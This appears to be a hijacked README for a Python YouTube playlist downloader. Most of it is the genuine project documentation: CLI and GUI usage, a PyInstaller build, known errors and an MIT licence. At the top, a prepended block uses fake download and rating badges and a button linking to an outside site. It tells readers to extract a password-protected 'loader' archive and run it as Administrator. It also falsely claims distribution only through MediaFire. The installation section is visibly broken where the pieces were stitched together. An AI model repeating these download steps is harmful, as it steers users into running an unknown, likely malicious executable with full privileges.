<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Features

- **Playlist Downloads:** Downloads all videos from a given YouTube playlist URL.
- **Folder Naming:** Converts the playlist title into an alphanumeric folder name to store downloaded videos.
- **High Resolution:** Downloads each video with the highest available resolution.
- **CLI and GUI:** Choose between the CLI version (using `playlist_downloader.py`) or the GUI version (`app.py`) for intuitive operation.
- **Real-Time Updates:** The GUI provides real-time download progress and error reporting.
- **Executable Build:** Easily build an executable using PyInstaller.

<p align="center" width="100%">
## Installation

1. Clone the repository:

```bash
## Usage

### Command Line Interface (CLI)

1. Run the CLI script:

```bash
python playlist_downloader.py
```

2. Follow the prompt:

   + Enter the YouTube playlist URL when prompted.
   + The script will create a folder (named by the sanitized playlist title and download all videos into it.
   + Progress updates and video size details are displayed in the terminal.

### Graphical User Interface (GUI)

1. Run the GUI application:

```bash
python app.py
```

2. Using the GUI:

   + Enter the YouTube playlist URL in the provided input field.
   + Click the "Download" button.
   + The GUI displays real-time progress in a log area.
   + A success message is shown when the process is complete.

### Creating an Executable

Since I'm on Ubuntu, you can build an executable for your environment as follows:

1. Build the executable with PyInstaller:

```bash
pyinstaller --onefile app.py
```

2. Executable:

   + This will generate an executable file in the `dist` folder.
   + Note: The executable is platform-specific. To create executables for Windows or macOS, you need to build the project on those platforms.

## Known Errors

### CLI

+ **Folder Already Exists**:

If a folder with the same name as the playlist already exists, the script will throw an error because it cannot recreate the folder. To resolve, delete or rename the existing folder before running the script.

### GUI

+ **Unresponsive Behavior**:

The GUI may appear unresponsive during long downloads. This is due to heavy processing in the background thread. Please be patient while the process completes; the GUI logs and final success message indicate completion.

## Additional Notes
+ The project now uses `yt_dlp` for improved compatibility and performance compared to the legacy `pytube` library.
+ For cross-platform builds, remember that executables are OS specific. Currently, only the Ubuntu executable is provided (built with PyInstaller on Ubuntu).


---

MIT License

Copyright (c) 2025 Dhananjay Porwal

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
